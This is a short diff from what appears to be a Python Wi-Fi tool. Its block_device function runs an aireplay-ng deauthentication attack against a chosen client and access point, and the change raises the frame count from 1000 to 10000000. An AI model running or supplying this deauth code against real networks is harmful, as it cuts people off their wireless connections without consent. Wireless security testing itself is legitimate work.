@@ -161,7 +161,7 @@ def block_device(network_monitor, wifi_network, device, stop_event):
     bssid = wifi_network.index[0]
     client = device.index[0]
 
-    cmd = (['aireplay-ng', '--deauth', '1000', '-a', bssid, '-c', client, network_monitor ])
+    cmd = (['aireplay-ng', '--deauth', '10000000', '-a', bssid, '-c', client, network_monitor ])
     deauth_thread = threading.Thread(target=execute_command_terminate, args = (cmd, stop_event,))
     deauth_thread.start()
     deauth_thread.join
